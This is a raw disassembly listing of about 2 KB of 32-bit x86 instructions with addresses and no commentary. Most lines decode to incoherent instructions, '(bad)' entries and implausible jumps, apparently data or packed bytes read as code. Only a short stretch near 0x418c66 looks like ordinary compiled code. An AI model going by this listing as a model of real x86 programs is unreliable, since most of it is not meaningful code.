  418868:	pop    ebx
  418869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41886a:	sti    
  41886b:	addr16 push cs
  41886d:	mov    al,0x46
  41886f:	das    
  418870:	xor    edx,esi
  418872:	test   al,0x28
  418874:	ss mov ch,0xcc
  418877:	push   esi
  418878:	xchg   BYTE PTR [ebp+0x5a859a66],dl
  41887e:	fnsave [ebx]
  418880:	sbb    bh,al
  418882:	imul   edi,DWORD PTR [edx+0x26],0x2b4e05f0
  418889:	cli    
  41888a:	xor    ah,BYTE PTR [eax]
  41888c:	repnz and al,0x89
  41888f:	imul   edi,DWORD PTR [ebx+0x77],0xffffff81
  418893:	hlt    
  418894:	jne    0x418894
  418896:	inc    ebp
  418897:	sub    BYTE PTR [eax],al
  418899:	aas    
  41889a:	mov    ecx,0xda7bd7e
  41889f:	shl    DWORD PTR [eax],cl
  4188a1:	add    ebp,DWORD PTR [edx+0x23725ef2]
  4188a7:	adc    al,0xc9
  4188a9:	nop
  4188aa:	fstp   TBYTE PTR cs:[ebp+0x2a]
  4188ae:	iret   
  4188af:	and    BYTE PTR [edi+ebp*8+0x5c],bh
  4188b3:	jle    0x4188f2
  4188b5:	push   ss
  4188b6:	call   DWORD PTR [esi+0x66]
  4188b9:	dec    edi
  4188ba:	jnp    0x4188dd
  4188bc:	ins    DWORD PTR es:[edi],dx
  4188bd:	repnz sar BYTE PTR [ebx+0x2e2e2781],1
  4188c4:	xor    eax,0x6b615b08
  4188c9:	or     BYTE PTR [esi-0x7e],cl
  4188cc:	or     DWORD PTR [edx+0x3b],ecx
  4188cf:	add    eax,0x27152e63
  4188d4:	or     al,BYTE PTR [esi+0x1266fdf9]
  4188da:	ficomp WORD PTR [edx+0x41b05885]
  4188e0:	shl    DWORD PTR [ebx-0x3f],0xdb
  4188e4:	mov    BYTE PTR [ebx+0xc],0xfc
  4188e8:	cmp    BYTE PTR [ebp+0x11ebc6b7],0xd
  4188ef:	cmp    eax,0x83ec753b
  4188f4:	pop    eax
  4188f5:	sbb    eax,DWORD PTR [esi-0x6]
  4188f8:	sahf   
  4188f9:	mov    ds:0xcf59b17,al
  4188fe:	int3   
  4188ff:	inc    esi
  418900:	xor    DWORD PTR [edx+0x33],eax
  418903:	ins    BYTE PTR es:[edi],dx
  418904:	test   eax,0xce84552d
  418909:	jmp    0xa8de:0x1de2d05
  418910:	(bad)  
  418911:	adc    eax,0xe99cd2f1
  418916:	inc    edi
  418917:	aaa    
  418918:	mov    ch,0xd9
  41891a:	jle    0x4188ce
  41891c:	xor    ebp,DWORD PTR [esi+ebp*1+0x63]
  418920:	ins    BYTE PTR es:[edi],dx
  418921:	dec    edx
  418922:	repnz mov eax,ds:0x4928be4a
  418928:	lea    edi,[ebx-0x55]
  41892b:	pop    es
  41892c:	int3   
  41892d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41892e:	mov    ecx,0xf73b8ac6
  418933:	jmp    0xdbb0:0x76fecb40
  41893a:	jo     0x41893a
  41893c:	adc    DWORD PTR [ebx+eiz*1+0x49],ebp
  418940:	sbb    BYTE PTR [ecx],0xcc
  418943:	hlt    
  418944:	jns    0x4188cf
  418946:	fild   WORD PTR [esi]
  418948:	mov    ch,0x5b
  41894a:	mov    ebx,0xcafa5f46
  41894f:	sbb    cl,BYTE PTR [eax]
  418951:	push   eax
  418952:	mov    ebx,0x139f9754
  418957:	jnp    0x418954
  418959:	shr    BYTE PTR [ebp+0xe68bd51],0x62
  418960:	xor    dh,bl
  418962:	dec    ebx
  418963:	test   BYTE PTR [ecx],bh
  418965:	mov    ds:0x6acca0b9,al
  41896a:	mov    ebp,0xfca10f9d
  41896f:	xchg   BYTE PTR [esp+ebp*4+0x0],cl
  418973:	sub    dl,ah
  418975:	imul   esi,ebx,0x7c530630
  41897b:	cli    
  41897c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41897d:	xor    ecx,DWORD PTR [eax-0x2b193ce9]
  418983:	sbb    DWORD PTR [esi-0x43],edi
  418986:	and    al,0xc7
  418988:	mov    esp,DWORD PTR [ebp+0x94edb1]
  41898e:	call   0xad69005
  418993:	loope  0x4189cd
  418995:	fwait
  418996:	adc    eax,0xd255af
  41899b:	mov    eax,0xf634b26
  4189a0:	pop    ds
  4189a1:	in     al,dx
  4189a2:	push   ebx
  4189a3:	dec    esi
  4189a4:	outs   dx,DWORD PTR ds:[esi]
  4189a5:	fwait
  4189a6:	jge    0x4189fe
  4189a8:	sbb    BYTE PTR [eax-0x34b2b05d],0xde
  4189af:	nop
  4189b0:	aaa    
  4189b1:	jne    0x418a2c
  4189b3:	(bad)  
  4189b5:	lahf   
  4189b6:	mov    esi,DWORD PTR [esi]
  4189b8:	and    edi,DWORD PTR ds:0x45839c7
  4189be:	dec    ebx
  4189bf:	pop    edi
  4189c0:	int3   
  4189c1:	loopne 0x4189bc
  4189c3:	mov    edi,0xb151937a
  4189c8:	retf   0xdc3a
  4189cb:	xor    DWORD PTR [ecx+0x554038a6],esi
  4189d1:	mov    BYTE PTR [ecx-0x10c9af85],ah
  4189d7:	test   DWORD PTR [ecx+0xe],0xef7d2f9a
  4189de:	aad    0x5b
  4189e0:	cmp    al,0xeb
  4189e2:	inc    ecx
  4189e3:	ins    DWORD PTR es:[edi],dx
  4189e4:	xchg   ebp,eax
  4189e5:	inc    eax
  4189e6:	or     eax,0xbc603a3
  4189eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ec:	aam    0xc3
  4189ee:	xor    ebx,edx
  4189f0:	or     BYTE PTR [di+0x7594],dh
  4189f5:	and    BYTE PTR [esi+0x63b199d5],ch
  4189fb:	cli    
  4189fc:	ret    
  4189fd:	addr16 test al,0x2c
  418a00:	xchg   edi,eax
  418a01:	in     al,0xe1
  418a03:	(bad)  
  418a04:	jmp    0x5fe903fc
  418a09:	hlt    
  418a0a:	and    ch,BYTE PTR [ebp-0x5]
  418a0d:	pop    edi
  418a0e:	jle    0x418a1b
  418a10:	arpl   WORD PTR [ebp+0x28],dx
  418a13:	mov    ecx,0x4b5b6817
  418a18:	(bad)  
  418a19:	fld    DWORD PTR [esi-0x4a]
  418a1c:	fwait
  418a1d:	dec    esp
  418a1e:	xor    eax,DWORD PTR [ebx]
  418a20:	sub    cl,al
  418a22:	mov    DWORD PTR [eax-0x644d103f],edx
  418a28:	and    DWORD PTR [eax+ebx*8-0x26],0xfffffff7
  418a2d:	or     ebp,esp
  418a2f:	cmp    BYTE PTR [eax-0x5455d089],0xac
  418a36:	sbb    al,0x97
  418a38:	out    0xe3,eax
  418a3a:	shr    BYTE PTR [edx-0x1067ac6a],0xa9
  418a41:	in     al,0x4d
  418a43:	(bad)  
  418a44:	cwde   
  418a45:	sti    
  418a46:	enter  0xfd60,0x9f
  418a4a:	imul   ecx,DWORD PTR [esi-0x41f0e167],0xffffffdb
  418a51:	jnp    0x418aad
  418a53:	pop    eax
  418a54:	es add eax,0x6ba04b83
  418a5a:	mov    cl,0x8d
  418a5c:	ret    0x1d82
  418a5f:	inc    esi
  418a60:	and    cl,0x6f
  418a63:	lods   eax,DWORD PTR ds:[esi]
  418a64:	out    0xb0,al
  418a66:	(bad)  
  418a67:	div    ah
  418a69:	xchg   ebp,eax
  418a6a:	jecxz  0x418a7d
  418a6c:	dec    ebx
  418a6d:	cmp    DWORD PTR [edx],ecx
  418a6f:	push   es
  418a70:	add    eax,0xe03bb765
  418a75:	mov    edx,0xaa0b1940
  418a7a:	mov    BYTE PTR [eax-0x5c7254e],dh
  418a80:	sub    edx,DWORD PTR [edi+0x16d850]
  418a86:	mov    cl,0x76
  418a88:	je     0x418aea
  418a8a:	outs   dx,DWORD PTR ds:[esi]
  418a8b:	add    bh,BYTE PTR [edx]
  418a8d:	js     0x418a80
  418a8f:	fs adc ebp,ebp
  418a92:	call   DWORD PTR ds:0x202ac17f
  418a98:	mov    edi,0xb2cd9a80
  418a9d:	push   ecx
  418a9e:	neg    cl
  418aa0:	jo     0x418a43
  418aa2:	mov    bh,ch
  418aa4:	js     0x418a52
  418aa6:	ins    DWORD PTR es:[edi],dx
  418aa7:	dec    ebx
  418aa8:	(bad)  
  418aaa:	jne    0x418a76
  418aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aad:	mov    dh,0x67
  418aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab0:	mov    dh,0x18
  418ab2:	clc    
  418ab3:	inc    ebp
  418ab4:	mov    ch,cl
  418ab6:	xchg   ebp,eax
  418ab7:	aam    0x63
  418ab9:	sbb    eax,0xd71f2d4e
  418abe:	mov    ecx,0x20d70ab
  418ac3:	sahf   
  418ac4:	and    eax,0xd7374f68
  418ac9:	mov    bh,0xed
  418acb:	mov    bl,0x52
  418acd:	aam    0xc2
  418acf:	sbb    cl,ah
  418ad1:	jb     0x418a8b
  418ad3:	retf   0xdc42
  418ad6:	loop   0x418b27
  418ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad9:	stos   DWORD PTR es:[edi],eax
  418ada:	mulps  xmm6,XMMWORD PTR gs:0x93f591b0
  418ae2:	add    al,0x36
  418ae4:	mov    ah,0xc9
  418ae6:	aam    0x52
  418ae8:	mov    ebx,0xeff4e61c
  418aed:	(bad)  
  418aef:	mov    WORD PTR [ebp-0x59],gs
  418af2:	or     BYTE PTR [ecx+0x14],dh
  418af5:	pop    edi
  418af6:	popf   
  418af7:	hlt    
  418af8:	test   BYTE PTR [ecx+0x3944195b],bh
  418afe:	mov    fs,WORD PTR [edi]
  418b00:	push   ss
  418b01:	jg     0x418aad
  418b03:	cmc    
  418b04:	pop    eax
  418b05:	int3   
  418b06:	sbb    al,0xfd
  418b08:	int    0x85
  418b0a:	aam    0xbb
  418b0c:	jb     0x418a9a
  418b0e:	shr    BYTE PTR [eax],0xce
  418b11:	inc    edi
  418b12:	push   ss
  418b13:	jne    0x418b22
  418b15:	ret    
  418b16:	adc    dh,BYTE PTR [ecx-0x19c6ac4a]
  418b1c:	jb     0x418b8a
  418b1e:	mov    dl,0xc0
  418b20:	es inc cx
  418b23:	call   DWORD PTR [ebp+0x2b]
  418b26:	dec    esi
  418b27:	retf   0x287d
  418b2a:	aad    0xe6
  418b2c:	int3   
  418b2d:	fcmovb st,st(3)
  418b2f:	out    0x33,eax
  418b31:	jnp    0x418ae7
  418b33:	sbb    al,0x2
  418b35:	mov    al,0xa9
  418b37:	stos   DWORD PTR es:[edi],eax
  418b38:	or     eax,0xe7e31e2e
  418b3d:	sub    DWORD PTR [ebp-0x6],0xffffff92
  418b41:	dec    esp
  418b42:	or     eax,ebx
  418b44:	pop    esi
  418b45:	jle    0x418bab
  418b47:	dec    esp
  418b48:	in     al,dx
  418b49:	adc    dl,ch
  418b4b:	hlt    
  418b4c:	xchg   ecx,eax
  418b4d:	adc    eax,DWORD PTR [edx-0x67]
  418b50:	mov    al,ds:0x41e3f4ca
  418b55:	xchg   ecx,eax
  418b56:	or     ebx,DWORD PTR [edi-0x2f44d3d5]
  418b5c:	cmc    
  418b5d:	push   ebp
  418b5e:	sar    DWORD PTR [eax-0x74],0x3
  418b62:	push   esi
  418b63:	shl    DWORD PTR [ebx+0x1],0xe6
  418b67:	mov    esi,0x2ae3f669
  418b6c:	adc    ecx,edx
  418b6e:	adc    al,0xce
  418b70:	test   al,0xf5
  418b72:	frstor [esi+0x70]
  418b75:	push   0xd56e2678
  418b7a:	push   0xcebb2ce5
  418b7f:	adc    BYTE PTR [edx],dh
  418b81:	ret    
  418b82:	neg    al
  418b84:	shr    BYTE PTR ds:0x712f5439,1
  418b8a:	fadd   QWORD PTR [eax]
  418b8c:	pop    edi
  418b8d:	adc    edx,DWORD PTR [esi]
  418b8f:	jae    0x418b78
  418b91:	xchg   esi,eax
  418b92:	dec    ecx
  418b93:	dec    ebp
  418b94:	ins    DWORD PTR es:[edi],dx
  418b95:	pop    eax
  418b96:	xor    DWORD PTR [eax-0x7351391e],esp
  418b9c:	fs jb  0x418b85
  418b9f:	xchg   esp,eax
  418ba0:	add    bl,BYTE PTR [esp+esi*8-0x1c272d1d]
  418ba7:	xchg   esp,eax
  418ba8:	dec    ebp
  418ba9:	xchg   DWORD PTR [esi],eax
  418bab:	sub    al,0xbd
  418bad:	mov    bl,BYTE PTR [edx-0x5f]
  418bb0:	and    al,0x2a
  418bb2:	and    al,0xbe
  418bb4:	mov    esi,0x1eefffe6
  418bb9:	clc    
  418bba:	cmp    esi,ecx
  418bbc:	cdq    
  418bbd:	fsub   st,st(3)
  418bbf:	xor    ebp,DWORD PTR [edi-0x27a4c6dc]
  418bc5:	sub    esp,edi
  418bc7:	inc    ebx
  418bc8:	pop    edi
  418bc9:	mov    ?,WORD PTR [edi]
  418bcb:	push   ds
  418bcc:	scas   al,BYTE PTR es:[edi]
  418bcd:	aam    0x35
  418bcf:	push   edx
  418bd0:	ror    BYTE PTR [ebx+0x14],1
  418bd3:	adc    eax,DWORD PTR [esi+edx*1-0x1]
  418bd7:	fistp  QWORD PTR [edx+esi*2-0x7c484ac]
  418bde:	sub    al,0x11
  418be0:	vmulpd ymm7,ymm3,YMMWORD PTR [eax+0x3a]
  418be5:	sbb    dl,ah
  418be7:	mov    ah,0x88
  418be9:	stos   DWORD PTR es:[edi],eax
  418bea:	mov    dl,0x8c
  418bec:	push   edi
  418bed:	cli    
  418bee:	mov    ebp,0x608fccc3
  418bf3:	adc    eax,0xa3f72506
  418bf8:	leave  
  418bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bfa:	and    BYTE PTR [ebp+0x3f95b2c3],0x2
  418c01:	stc    
  418c02:	pop    ebp
  418c03:	jmp    0xa2c:0x1039f4c
  418c0a:	(bad)  
  418c0b:	xor    esi,esi
  418c0d:	mov    cl,0x8e
  418c0f:	and    al,0x46
  418c11:	and    DWORD PTR [ebx+0x15],edx
  418c14:	add    esp,ebx
  418c16:	sahf   
  418c17:	and    bl,BYTE PTR [esi+eiz*4]
  418c1a:	pop    ss
  418c1b:	test   DWORD PTR [edi],ebp
  418c1d:	jmp    0x9d31:0xbffdf6bd
  418c24:	inc    esi
  418c25:	outs   dx,DWORD PTR ds:[esi]
  418c26:	out    dx,al
  418c27:	add    cl,BYTE PTR [ecx+0xd]
  418c2a:	imul   edi,DWORD PTR [ebx+0x61],0x1897545f
  418c31:	mov    ah,0x35
  418c33:	add    ah,bl
  418c35:	push   esp
  418c36:	mov    esp,0x21c3795f
  418c3b:	test   eax,0xbc30b1f4
  418c40:	mov    ss,WORD PTR [edx-0x208e9d4]
  418c46:	popf   
  418c47:	sub    ecx,DWORD PTR [esi+0x42]
  418c4a:	mov    esp,0x551c52c1
  418c4f:	and    al,0xc3
  418c51:	push   cs
  418c52:	mov    dh,0xde
  418c54:	addr16 jp 0x418c04
  418c57:	(bad)
  418c5a:	retf   0x2566
  418c5d:	jne    0x418c1d
  418c5f:	mov    cl,0x6a
  418c61:	dec    esp
  418c62:	jl     0x418cc7
  418c64:	add    bl,cl
  418c66:	mov    ebx,DWORD PTR [ebp-0x50]
  418c69:	add    edx,ecx
  418c6b:	xor    edx,ebx
  418c6d:	mov    DWORD PTR [ebp-0x50],edx
  418c70:	mov    edx,DWORD PTR [ebp+0x8]
  418c73:	mov    ebx,DWORD PTR [ebp-0x4c]
  418c76:	add    edx,edi
  418c78:	and    edx,ebx
  418c7a:	mov    DWORD PTR [ebp-0x4c],edx
  418c7d:	mov    edx,DWORD PTR [ebp+0x8]
  418c80:	mov    ebx,DWORD PTR [ebp-0x48]
  418c83:	lea    edx,[ebx+edx*1+0x241fcde]
  418c8a:	mov    DWORD PTR [ebp-0x48],edx
  418c8d:	mov    edx,DWORD PTR [ebp+0x8]
  418c90:	mov    ebx,0xfa5e1521
  418c95:	sub    ebx,edx
  418c97:	add    ebx,DWORD PTR [ebp-0x44]
  418c9a:	mov    DWORD PTR [ebp-0x44],ebx
  418c9d:	mov    edx,DWORD PTR [ebp+0x8]
  418ca0:	xor    edx,eax
  418ca2:	add    edx,esi
  418ca4:	jne    0x4144eb
  418caa:	jmp    0x41b0d8
  418caf:	jmp    0x41b050
  418cb4:	ins    BYTE PTR es:[edi],dx
  418cb5:	loopne 0x418cba
  418cb7:	jmp    0x418c3c
  418cb9:	mov    eax,DWORD PTR [ebx+ebx*8+0x6fd1292a]
  418cc0:	shr    ecx,0x5e
  418cc3:	mov    ebp,0x7a7d1f32
  418cc8:	(bad)  
  418cc9:	pop    edi
  418cca:	jp     0x418d46
  418ccc:	outs   dx,DWORD PTR ds:[esi]
  418ccd:	xor    ecx,DWORD PTR [edx]
  418ccf:	jbe    0x418c5b
  418cd1:	inc    ebx
  418cd2:	sub    eax,0xaf922fa6
  418cd7:	cwde   
  418cd8:	popf   
  418cd9:	add    BYTE PTR [ebp-0x1b],bh
  418cdc:	inc    ecx
  418cdd:	pusha  
  418cde:	add    ebp,eax
  418ce0:	pop    edi
  418ce1:	scas   eax,DWORD PTR es:[edi]
  418ce2:	(bad)  
  418ce4:	xchg   ecx,eax
  418ce5:	loope  0x418d0b
  418ce7:	test   eax,0xc1f4ed4
  418cec:	jl     0x418d54
  418cee:	int3   
  418cef:	push   ebp
  418cf0:	fist   DWORD PTR ss:[eax]
  418cf3:	pop    ebp
  418cf4:	gs add eax,0xc84496dd
  418cfa:	push   0xd86da079
  418cff:	push   ebp
  418d00:	dec    esi
  418d01:	out    dx,al
  418d02:	les    esp,FWORD PTR [edx-0x69]
  418d05:	into   
  418d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d07:	and    edi,DWORD PTR ds:0x302ae237
  418d0d:	and    al,BYTE PTR [edx+0x4a]
  418d10:	mov    al,ds:0x6e41df50
  418d15:	lods   eax,DWORD PTR ds:[esi]
  418d16:	sub    ebp,DWORD PTR [eax+0x76]
  418d19:	mov    dl,0x46
  418d1b:	jle    0x418d39
  418d1d:	push   cs
  418d1e:	jle    0x418d9e
  418d20:	lds    ecx,FWORD PTR fs:[eax-0x35]
  418d24:	(bad)  
  418d25:	dec    edi
  418d26:	mov    DWORD PTR [esi+edx*2],esi
  418d29:	(bad)  
  418d2a:	in     eax,dx
  418d2b:	dec    ecx
  418d2c:	xor    BYTE PTR [edx-0x76],ah
  418d2f:	ss (bad) 
  418d31:	jmp    0x53414aca
  418d36:	mov    DWORD PTR [edi+0xf9e9f46],eax
  418d3c:	jmp    DWORD PTR [esi+0x78a4d596]
  418d42:	sub    BYTE PTR [esi+0x12],bl
  418d45:	mov    bl,BYTE PTR [edx+0x37ef57cc]
  418d4b:	daa    
  418d4c:	and    BYTE PTR [ebp+ebx*4-0x76a235c3],ch
  418d53:	xor    BYTE PTR [ebp-0x5b],bh
  418d56:	adc    al,0xcc
  418d58:	lahf   
  418d59:	test   al,0x1c
  418d5b:	dec    ebp
  418d5c:	mov    ds:0x4a004b3d,eax
  418d61:	add    al,0x4c
  418d63:	jnp    0x418d02
  418d65:	(bad)  
  418d66:	daa    
  418d67:	and    eax,0x42a50b68
  418d6c:	ficomp WORD PTR [edx-0xd]
  418d6f:	push   eax
  418d70:	inc    ecx
  418d71:	dec    edx
  418d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d73:	enter  0x3358,0x62
  418d77:	stos   DWORD PTR es:[edi],eax
  418d78:	lahf   
  418d79:	sub    eax,0x2d08b4cc
  418d7e:	sbb    eax,0x8b679686
  418d83:	aas    
  418d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d85:	sti    
  418d86:	popa   
  418d87:	jne    0x418d1d
  418d89:	jecxz  0x418dbb
  418d8b:	adc    eax,0x9e60cd2
  418d90:	inc    ebp
  418d91:	fcom   QWORD PTR [esi-0x36]
  418d94:	ss ret 0x28ac
  418d98:	scas   al,BYTE PTR es:[edi]
  418d99:	mov    ch,0xa6
  418d9b:	pop    ecx
  418d9c:	(bad)  
  418d9d:	jo     0x418d63
  418d9f:	fneni(8087 only) 
  418da1:	cs in  eax,dx
  418da3:	(bad)  
  418da5:	adc    al,0x5d
  418da7:	fadd   DWORD PTR [ebx-0x61]
  418daa:	pop    es
  418dab:	push   esp
  418dac:	push   esi
  418dad:	jnp    0x418dda
  418daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db0:	clc    
  418db1:	cld    
  418db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418db3:	test   eax,0xe9081404
  418db8:	or     al,0xa4
  418dba:	adc    eax,0xab19d26d
  418dbf:	mov    ebx,DWORD PTR [esi+0x2b8449ec]
  418dc5:	rcr    bh,0x5f
  418dc8:	shl    DWORD PTR [bp+di+0x39],cl
  418dcc:	add    DWORD PTR [edi+0x323769a4],ebp
  418dd2:	mov    bh,0xb4
  418dd4:	(bad)  
  418dd5:	and    al,0xd
  418dd7:	test   eax,0x6ed9debf
  418ddc:	scas   eax,DWORD PTR es:[edi]
  418ddd:	(bad)  [esi+0x107bb825]
  418de3:	dec    esi
  418de4:	lods   al,BYTE PTR gs:[esi]
  418de6:	inc    ecx
  418de7:	ss inc ebp
  418de9:	or     esp,esi
  418deb:	aam    0x7f
  418ded:	js     0x418e3e
  418def:	push   cs
  418df0:	sub    DWORD PTR fs:[edi-0x73],ebx
  418df4:	retf   
  418df5:	jb     0x418dd3
  418df7:	push   ss
  418df8:	es pop ds
  418dfa:	aam    0x6f
  418dfc:	scas   eax,DWORD PTR es:[edi]
  418dfd:	aaa    
  418dfe:	cmp    BYTE PTR [eax-0x43dff868],ch
  418e04:	pushf  
  418e05:	mov    edi,0x26f4fcc1
  418e0a:	sbb    DWORD PTR [eax+0x5a],0x3
  418e0e:	gs cmp eax,0x421ed784
  418e14:	aad    0x6d
  418e16:	push   edx
  418e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e18:	pop    ecx
  418e19:	dec    esi
  418e1a:	loope  0x418e75
  418e1c:	add    eax,edi
  418e1e:	in     al,dx
  418e1f:	or     al,0xe2
  418e21:	(bad)  
  418e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e23:	in     eax,0xc2
  418e25:	test   eax,edx
  418e27:	fldcw  WORD PTR [eax+edi*4]
  418e2a:	xchg   ch,ah
  418e2c:	and    eax,0x490b8fbb
  418e31:	retf   
  418e32:	sbb    BYTE PTR [esi+0x263a6337],bl
  418e38:	(bad)  
  418e39:	fcom   st(5)
  418e3b:	dec    esp
  418e3c:	lods   al,BYTE PTR ds:[esi]
  418e3d:	ja     0x418dc8
  418e3f:	adc    ecx,DWORD PTR [edi]
  418e41:	mov    ah,0x5e
  418e43:	lock pop esi
  418e45:	aad    0xcb
  418e47:	xchg   ecx,eax
  418e48:	sar    DWORD PTR [ebp-0x69],1
  418e4b:	add    dh,bh
  418e4d:	inc    edi
  418e4e:	ja     0x418ecb
  418e50:	mov    WORD PTR [edx],ss
  418e52:	add    al,0x81
  418e54:	mov    al,0x9d
  418e56:	(bad)  
  418e57:	popf   
  418e58:	dec    esi
  418e59:	daa    
  418e5a:	pop    ss
  418e5b:	mov    ds:0x59cb91ea,eax
  418e60:	xor    ch,al
  418e62:	adc    DWORD PTR [ebp-0x401eb1a],edi
  418e68:	mov    esp,0x4dbceef2
  418e6d:	lods   al,BYTE PTR ds:[esi]
  418e6e:	data16 das 
  418e70:	or     edi,DWORD PTR [ebx]
  418e72:	inc    eax
  418e73:	and    dh,0x6e
  418e76:	fiadd  WORD PTR [edx]
  418e78:	mov    dh,0xfb
  418e7a:	ja     0x418e08
  418e7c:	dec    ebx
  418e7d:	sar    DWORD PTR [esi],0x9
  418e80:	test   BYTE PTR [ebx-0x2a],bl
  418e83:	in     al,0xca
  418e85:	nop
  418e86:	mov    dl,0x22
  418e88:	cwde   
  418e89:	adc    DWORD PTR [edi-0x43cbff60],ebp
  418e8f:	add    al,0xdf
  418e91:	xor    cl,BYTE PTR [ebx+eiz*2]
  418e94:	adc    ch,BYTE PTR [ebx+0x30]
  418e97:	gs sub al,0xac
  418e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e9b:	loopne 0x418ea2
  418e9d:	ss popa 
  418e9f:	call   0x1cdb3de2
  418ea4:	ds pop esp
  418ea6:	loopne 0x418e2b
  418ea8:	movzx  ebp,WORD PTR [ebx+0x138032a9]
  418eaf:	pop    ds
  418eb0:	xlat   BYTE PTR ds:[ebx]
  418eb1:	pop    es
  418eb2:	imul   eax,edx,0x5471eb72
  418eb8:	xchg   edx,eax
  418eb9:	and    edi,DWORD PTR [edi]
  418ebb:	jmp    0xf63d:0x74312956
  418ec2:	dec    edx
  418ec3:	adc    BYTE PTR [esi-0x67232a8c],bh
  418ec9:	out    dx,eax
  418eca:	push   ss
  418ecb:	adc    al,0x65
  418ecd:	(bad)  
  418ece:	dec    ebx
  418ecf:	mov    esi,0x6f52c443
  418ed4:	(bad)  
  418ed5:	push   ecx
  418ed6:	outs   dx,BYTE PTR ds:[esi]
  418ed7:	lahf   
  418ed8:	ins    BYTE PTR es:[edi],dx
  418ed9:	fs xchg edx,eax
  418edb:	lods   eax,DWORD PTR ds:[esi]
  418edc:	pop    ecx
  418edd:	(bad)  
  418edf:	ins    DWORD PTR es:[edi],dx
  418ee0:	ss cld 
  418ee2:	cmp    bl,BYTE PTR [edi-0x1cf48752]
  418ee8:	sub    eax,0xfd33445b
  418eed:	pop    es
  418eee:	xchg   ecx,eax
  418eef:	dec    ecx
  418ef0:	cmp    al,0x6a
  418ef2:	fidiv  DWORD PTR [edx+0x1b]
  418ef5:	rol    ch,1
  418ef7:	loop   0x418f3c
  418ef9:	in     eax,0xf2
  418efb:	sbb    eax,0x59218bd9
  418f00:	xchg   ebx,eax
  418f01:	add    BYTE PTR [ebx],dh
  418f03:	cmp    eax,0xf5bf5eca
  418f08:	sbb    al,al
  418f0a:	popf   
  418f0b:	push   0xffffffc2
  418f0d:	lahf   
  418f0e:	ror    dl,0x89
  418f11:	and    BYTE PTR [edi+ecx*2+0xc3f601d],al
  418f18:	push   edx
  418f19:	mov    bh,0xd3
  418f1b:	mov    ds,eax
  418f1d:	sub    ecx,ebp
  418f1f:	retf   
  418f20:	sar    DWORD PTR ds:0x6203b191,0x57
  418f27:	es jae 0x418ec5
  418f2a:	xchg   esi,eax
  418f2b:	jge    0x418ead
  418f2d:	je     0x418fa4
  418f2f:	lods   eax,DWORD PTR ds:[esi]
  418f30:	rol    DWORD PTR ds:0x27cf6d77,0xa6
  418f37:	in     al,0x3c
  418f39:	mov    ebp,0xec1a4bb6
  418f3e:	inc    ebx
  418f3f:	add    ch,BYTE PTR [edx+0x20bdeec]
  418f45:	fsub   DWORD PTR [edi+ebp*2]
  418f48:	jmp    0xcd83:0x131f3b49
  418f4f:	jge    0x418f7e
  418f51:	dec    ebp
  418f52:	inc    ebp
  418f53:	lods   al,BYTE PTR ds:[esi]
  418f54:	jp     0x418fc9
  418f56:	clc    
  418f57:	dec    esp
  418f58:	pop    edi
  418f59:	je     0x418f41
  418f5b:	arpl   WORD PTR [ebx+edx*1-0x1ad7eb6c],sp
  418f62:	jle    0x418fc3
  418f64:	mov    ebx,0xc53ccc09
  418f69:	leave  
  418f6a:	(bad)  
  418f6b:	gs xor dh,ch
  418f6e:	scas   al,BYTE PTR es:[edi]
  418f6f:	jbe    0x418f4b
  418f71:	sbb    al,0xe4
  418f73:	pop    ecx
  418f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f75:	cmp    al,0xa9
  418f77:	sub    DWORD PTR [esi-0x2e],edi
  418f7a:	fstp   QWORD PTR [eax-0x2a]
  418f7d:	mov    ebp,?
  418f7f:	leave  
  418f80:	(bad)  
  418f81:	fidiv  DWORD PTR [ecx+edx*2+0xaf95636]
  418f88:	push   0xffffff84
  418f8a:	clc    
  418f8b:	mov    eax,0xc1cf28de
  418f90:	ret    0x9a4a
  418f93:	or     ebp,DWORD PTR [eax]
  418f95:	adc    BYTE PTR [ebx],cl
  418f97:	mov    cl,0x17
  418f99:	jp     0x418ffe
  418f9b:	xor    ecx,DWORD PTR [ecx]
  418f9d:	pop    es
  418f9e:	add    eax,0x34a76b4f
  418fa3:	stos   DWORD PTR es:[edi],eax
  418fa4:	cmp    al,0x14
  418fa6:	sub    esp,DWORD PTR [eax+0x67d2d9b5]
  418fac:	xor    BYTE PTR [eax-0x1fb38498],bh
  418fb2:	dec    esi
  418fb3:	scas   al,BYTE PTR es:[edi]
  418fb4:	(bad)  
  418fb5:	fidivr DWORD PTR [ecx+0x575f5e17]
  418fbb:	test   DWORD PTR [esi-0x43da6727],0xcf45f78a
  418fc5:	fstp   DWORD PTR [eax-0x61]
  418fc8:	fnstcw WORD PTR [edi+0x73]
  418fcb:	mov    gs,WORD PTR [edx]
  418fcd:	(bad)  
  418fcf:	aam    0x55
  418fd1:	shl    edx,0x63
  418fd4:	mov    WORD PTR [ebx+ebp*2+0x55],?
  418fd8:	idiv   DWORD PTR [edx-0x170327d4]
  418fde:	sub    cl,dl
  418fe0:	xchg   DWORD PTR [eax+0x52ea6f40],edx
  418fe6:	into   
  418fe7:	int    0x59
  418fe9:	push   cs
  418fea:	ret    0x8aaf
  418fed:	stos   DWORD PTR es:[edi],eax
  418fee:	xlat   BYTE PTR ds:[ebx]
  418fef:	pop    ds
  418ff0:	xor    DWORD PTR [edx-0x18],0x3babf9b3
  418ff7:	fcom   QWORD PTR [edi+0x2f]
  418ffa:	mov    al,ds:0x9d0032cb
  418fff:	dec    esp
  419000:	adc    BYTE PTR [ecx-0x272031f],ch
  419006:	lods   eax,DWORD PTR cs:[esi]
  419008:	xchg   bh,dh
  41900a:	and    al,0x86
